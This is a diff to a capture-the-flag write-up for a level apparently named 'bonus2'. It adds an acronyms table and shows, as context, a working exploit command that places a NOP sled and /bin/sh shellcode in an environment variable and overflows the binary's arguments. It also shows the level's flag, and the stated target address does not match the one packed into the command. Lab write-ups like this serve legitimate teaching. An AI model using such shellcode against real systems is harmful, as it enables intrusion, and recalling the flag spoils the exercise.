@@ -83,6 +83,12 @@ Target the middle of the NOP sled: `0xbffffedd + 100 = 0xbfffff41`.
 ### Exploit Command
 LANG=fi EGG=$(python -c "print '\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'") /home/user/bonus2/bonus2 $(python -c "print 'A'*40") $(python -c "import struct; print 'B'*18 + struct.pack('<I', 0xbffff64c)")
 
+### Acronyms
+SSH    Secure Shell                        A cryptographic network protocol for secure remote login and command execution over an unsecured network
+NX     No-eXecute                          A memory protection that marks regions (stack, heap) as non-executable; disabled here (RWE), allowing shellcode on the stack
+ASLR   Address Space Layout Randomization  A kernel security feature that randomizes base addresses; disabled here, making the EGG environment variable address predictable
+PTY    Pseudo-Terminal                     A software terminal pair (master/slave) that emulates a real terminal, used here to interact with the binary's stdin/stdout over SSH
+
 ### Flag
 
 `71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`
